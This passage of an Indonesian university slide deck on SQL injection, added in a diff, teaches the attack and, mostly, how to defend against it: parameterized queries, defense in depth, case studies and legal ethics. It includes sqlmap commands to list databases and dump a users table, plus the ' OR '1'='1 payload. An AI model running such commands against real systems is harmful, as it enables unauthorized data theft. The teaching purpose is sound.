+                        <p style="color: #888;"># List semua database</p>
+                        <p>sqlmap -u <span class="highlight-green">"http://target.com/page?id=1"</span> <span class="highlight-yellow">--dbs</span></p>
+                        <br>
+                        <p style="color: #888;"># Dump tabel users</p>
+                        <p>sqlmap -u <span class="highlight-green">"..."</span> -D namadb -T users <span class="highlight-red">--dump</span></p>
+                    </div>
+                </section>
+
+                <!-- Tools Lainnya -->
+                <section>
+                    <h2>🧰 Tools Lainnya</h2>
+                    <div class="two-column">
+                        <div>
+                            <div class="info-box">
+                                <p><strong>🔵 Burp Suite</strong></p>
+                                <ul>
+                                    <li>Intercepting proxy</li>
+                                    <li>Scanner otomatis</li>
+                                    <li>Intruder & Repeater</li>
+                                </ul>
+                            </div>
+                            <div class="info-box">
+                                <p><strong>🟢 OWASP ZAP</strong></p>
+                                <ul>
+                                    <li>Gratis & open-source</li>
+                                    <li>Active/passive scan</li>
+                                    <li>Alternatif Burp</li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div>
+                            <div class="info-box">
+                                <p><strong>🟡 Havij</strong></p>
+                                <ul>
+                                    <li>GUI friendly</li>
+                                    <li>Untuk pemula</li>
+                                    <li>Otomatis</li>
+                                </ul>
+                            </div>
+                            <div class="info-box">
+                                <p><strong>⚪ Manual Testing</strong></p>
+                                <ul>
+                                    <li>Browser + cURL</li>
+                                    <li>Pemahaman SQL</li>
+                                    <li>Paling fleksibel</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+            </section>
+
+            <!-- BAGIAN 6: MITIGASI -->
+            <section>
+                <section class="center">
+                    <h1>🛡️ BAGIAN 6</h1>
+                    <h2>Strategi Mitigasi</h2>
+                    <p class="small-text">Cara mencegah SQL Injection</p>
+                </section>
+
+                <!-- Solusi Utama -->
+                <section>
+                    <h2>⭐ Solusi #1: Parameterized Query</h2>
+                    <p>Metode <span class="highlight-green">PALING EFEKTIF</span> mencegah SQL Injection</p>
+                    <div class="comparison-table">
+                        <div class="comparison-col" style="background: linear-gradient(135deg, #4a1a1a, #2d1a1a);">
+                            <p class="center-content"><span class="vs-badge" style="background: #ff6b6b;">❌ RENTAN</span></p>
+                            <div class="code-box" style="font-size: 0.7em;">
+                                <p>query = "SELECT * FROM users</p>
+                                <p>WHERE user='" + <span class="highlight-red">input</span> + "'"</p>
+                            </div>
+                            <p class="small-text">Input digabung langsung</p>
+                        </div>
+                        <div class="comparison-col" style="background: linear-gradient(135deg, #1a4a1a, #1a2d1a);">
+                            <p class="center-content"><span class="vs-badge" style="background: #51cf66;">✅ AMAN</span></p>
+                            <div class="code-box" style="font-size: 0.7em;">
+                                <p>stmt = "SELECT * FROM users</p>
+                                <p>WHERE user = <span class="highlight-green">?</span>"</p>
+                                <p>execute(stmt, [<span class="highlight-blue">input</span>])</p>
+                            </div>
+                            <p class="small-text">Input terpisah dari query</p>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Cara Kerja Parameterized -->
+                <section>
+                    <h2>🔄 Cara Kerja Parameterized Query</h2>
+                    <div class="step-box">
+                        <div class="step-number">1</div>
+                        <div>
+                            <strong>Kompilasi Query</strong><br>
+                            <span class="small-text">Database memproses struktur query terlebih dahulu</span>
+                        </div>
+                    </div>
+                    <div class="step-box">
+                        <div class="step-number">2</div>
+                        <div>
+                            <strong>Binding Parameter</strong><br>
+                            <span class="small-text">Input user dimasukkan sebagai DATA, bukan kode</span>
+                        </div>
+                    </div>
+                    <div class="step-box">
+                        <div class="step-number">3</div>
+                        <div>
+                            <strong>Eksekusi Aman</strong><br>
+                            <span class="small-text">Karakter khusus otomatis di-escape</span>
+                        </div>
+                    </div>
+                    <div class="safe-box" style="margin-top: 20px;">
+                        <p>💡 <strong>Kunci:</strong> Input <code>' OR '1'='1</code> menjadi:</p>
+                        <p><code>WHERE user = <span class="highlight-green">'\' OR \'1\'=\'1'</span></code></p>
+                        <p class="small-text">Database mencari user dengan nama literal tersebut (tidak ditemukan)</p>
+                    </div>
+                </section>
+
+                <!-- Defense in Depth -->
+                <section>
+                    <h2>🏰 Defense in Depth</h2>
+                    <p>Gunakan <span class="highlight-yellow">BANYAK LAPISAN</span> pertahanan!</p>
+                    <div class="layer-defense">
+                        <div class="layer-box" style="background: #1e3a5f;">
+                            <p>🔥</p>
+                            <p><strong>WAF</strong></p>
+                            <p class="small-text">Blokir pola serangan</p>
+                        </div>
+                        <div class="layer-box" style="background: #2980b9;">
+                            <p>✓</p>
+                            <p><strong>Validasi</strong></p>
+                            <p class="small-text">Filter input</p>
+                        </div>
+                        <div class="layer-box" style="background: #27ae60;">
+                            <p>?</p>
+                            <p><strong>Parameterized</strong></p>
+                            <p class="small-text">Query aman</p>
+                        </div>
+                        <div class="layer-box" style="background: #f39c12;">
+                            <p>🔒</p>
+                            <p><strong>Least Priv</strong></p>
+                            <p class="small-text">Izin minimal</p>
+                        </div>
+                        <div class="layer-box" style="background: #9b59b6;">
+                            <p>⚠️</p>
+                            <p><strong>Error</strong></p>
+                            <p class="small-text">Sembunyikan</p>
+                        </div>
+                    </div>
+                    <div class="info-box" style="margin-top: 20px;">
+                        <p>💡 Jika satu lapisan gagal, lapisan lain tetap melindungi!</p>
+                    </div>
+                </section>
+
+                <!-- Checklist Mitigasi -->
+                <section>
+                    <h2>✅ Checklist Mitigasi</h2>
+                    <div class="two-column">
+                        <div>
+                            <div class="safe-box">
+                                <p><strong>Wajib Dilakukan:</strong></p>
+                                <ul>
+                                    <li>✅ Gunakan Parameterized Query</li>
+                                    <li>✅ Validasi input (whitelist)</li>
+                                    <li>✅ Escape karakter khusus</li>
+                                    <li>✅ Batasi hak akses database</li>
+                                    <li>✅ Update & patch rutin</li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div>
+                            <div class="danger-box">
+                                <p><strong>Hindari:</strong></p>
+                                <ul>
+                                    <li>❌ Concatenation langsung</li>
+                                    <li>❌ Tampilkan error detail</li>
+                                    <li>❌ Akun DB dengan hak admin</li>
+                                    <li>❌ Blacklist saja (tidak cukup)</li>
+                                    <li>❌ Percaya input user</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+            </section>
+
+            <!-- BAGIAN 7: STUDI KASUS -->
+            <section>
+                <section class="center">
+                    <h1>📰 BAGIAN 7</h1>
+                    <h2>Studi Kasus Nyata</h2>
+                    <p class="small-text">Pembelajaran dari insiden keamanan</p>
+                </section>
+
+                <!-- Case 1 -->
+                <section>
+                    <h2>💳 Heartland Payment (2008)</h2>
+                    <div class="danger-box">
+                        <div class="two-column">
+                            <div>
+                                <p><strong>Apa yang terjadi:</strong></p>
+                                <ul>
+                                    <li>SQL Injection sebagai pintu masuk</li>
+                                    <li>Malware terinstal di server</li>
+                                    <li>Data dicuri saat transaksi</li>
+                                </ul>
+                            </div>
+                            <div>
+                                <p><strong>Dampak:</strong></p>
+                                <ul>
+                                    <li class="highlight-red">130+ juta kartu kredit dicuri</li>
+                                    <li>Kerugian $140 juta+</li>
+                                    <li>CEO dipenjara</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="info-box" style="margin-top: 20px;">
+                        <p>💡 <strong>Pelajaran:</strong> Satu kerentanan SQL Injection bisa menjadi pintu masuk untuk serangan yang lebih besar</p>
+                    </div>
+                </section>
+
+                <!-- Case 2 -->
+                <section>
+                    <h2>🎮 Sony PlayStation Network (2011)</h2>
+                    <div class="danger-box">
+                        <div class="two-column">
+                            <div>
+                                <p><strong>Apa yang terjadi:</strong></p>
+                                <ul>
+                                    <li>Jaringan PSN diretas</li>
+                                    <li>Layanan offline 23 hari</li>
+                                    <li>SQL Injection salah satu vektor</li>
+                                </ul>
+                            </div>
+                            <div>
+                                <p><strong>Dampak:</strong></p>
+                                <ul>
+                                    <li class="highlight-red">77 juta akun terekspos</li>
+                                    <li>Kerugian $171 juta</li>
+                                    <li>Reputasi rusak parah</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="info-box" style="margin-top: 20px;">
+                        <p>💡 <strong>Pelajaran:</strong> Perusahaan besar pun bisa menjadi korban jika tidak menerapkan keamanan dengan benar</p>
+                    </div>
+                </section>
+            </section>
+
+            <!-- BAGIAN 8: ETIKA -->
+            <section>
+                <section class="center">
+                    <h1>⚖️ BAGIAN 8</h1>
+                    <h2>Etika & Legalitas</h2>
+                    <p class="small-text">Batasan yang harus dipatuhi</p>
+                </section>
+
+                <!-- Peringatan -->
+                <section>
+                    <h2>⚠️ PERINGATAN PENTING</h2>
+                    <div class="danger-box" style="font-size: 1.1em;">
+                        <p class="center-content icon-large">🚨</p>
+                        <p class="center-content">Melakukan SQL Injection pada sistem<br><span class="highlight-red">TANPA IZIN</span> adalah <span class="highlight-red">ILEGAL!</span></p>
+                    </div>
+                    <div class="info-box" style="margin-top: 20px;">
+                        <p><strong>Di Indonesia:</strong></p>
+                        <ul>
+                            <li><strong>UU ITE Pasal 30:</strong> Akses ilegal → pidana 6-8 tahun</li>
+                            <li><strong>UU ITE Pasal 32:</strong> Manipulasi data → pidana 8-10 tahun</li>
+                            <li><strong>UU PDP:</strong> Pelanggaran data pribadi → denda hingga 2%</li>
+                        </ul>
+                    </div>
+                </section>
+
+                <!-- Yang Boleh -->
+                <section>
+                    <h2>✅ Yang BOLEH Dilakukan</h2>
+                    <div class="safe-box">
+                        <ul>
+                            <li>🎓 Belajar di <strong>lab virtual</strong> sendiri (DVWA, SQLi-labs)</li>
+                            <li>📝 Pengujian dengan <strong>izin tertulis</strong> dari pemilik sistem</li>
+                            <li>🏢 <strong>Bug bounty</strong> resmi dari perusahaan</li>
+                            <li>💼 <strong>Penetration testing</strong> dengan kontrak legal</li>
+                            <li>🔬 Riset keamanan yang <strong>bertanggung jawab</strong></li>
+                        </ul>
+                    </div>
+                    <div class="warning-box" style="margin-top: 20px;">
+                        <p>📌 <strong>Prinsip:</strong> "Jika ragu, JANGAN lakukan!"</p>
+                    </div>
+                </section>
+            </section>
+
+            <!-- RANGKUMAN -->
+            <section>
+                <section class="center">
+                    <h1>📝 RANGKUMAN</h1>
+                </section>
+
+                <section>
+                    <h2>🎯 Poin-Poin Utama</h2>
+                    <div class="step-box">
+                        <div class="step-number" style="background: #e74c3c;">!</div>
+                        <div><strong>SQL Injection</strong> = menyisipkan kode SQL berbahaya ke input aplikasi</div>
+                    </div>
+                    <div class="step-box">
+                        <div class="step-number" style="background: #f39c12;">!</div>
+                        <div><strong>Tipe utama:</strong> In-Band (Error/Union) dan Blind (Boolean/Time)</div>
+                    </div>
+                    <div class="step-box">
+                        <div class="step-number" style="background: #27ae60;">!</div>
+                        <div><strong>Mitigasi #1:</strong> Parameterized Query (pisahkan kode & data)</div>
+                    </div>
+                    <div class="step-box">
+                        <div class="step-number" style="background: #3498db;">!</div>
+                        <div><strong>Defense in Depth:</strong> Gunakan banyak lapisan pertahanan</div>
+                    </div>
+                    <div class="step-box">
+                        <div class="step-number" style="background: #9b59b6;">!</div>
+                        <div><strong>Etika:</strong> Hanya uji sistem dengan izin resmi!</div>
+                    </div>
+                </section>
+            </section>
+
+            <!-- PENUTUP -->
+            <section class="center">
+                <h1>🙏 Terima Kasih</h1>
+                <h3>Modul 12: SQL Injection</h3>
+                <div class="info-box" style="margin-top: 40px; display: inline-block;">
+                    <p><strong>Pertanyaan?</strong></p>
+                    <p>Mari diskusikan bersama!</p>
+                </div>
+                <p style="margin-top: 40px;">
+                    <span class="highlight-blue">Pengantar Keamanan Siber</span><br>
+                    <span class="small-text">Universitas Pertahanan RI</span>
+                </p>
+            </section>
+
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/reveal.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/plugin/highlight/highlight.min.js"></script>
+    <script>
+        Reveal.initialize({
+            hash: true,
+            slideNumber: 'c/t',
+            showSlideNumber: 'all',
+            transition: 'slide',
+            transitionSpeed: 'default',
+            backgroundTransition: 'fade',
+            center: false,
+            width: 1200,
+            height: 700,
+            margin: 0.1,
+            plugins: [ RevealHighlight ]
+        });
+    </script>
+</body>
+</html>
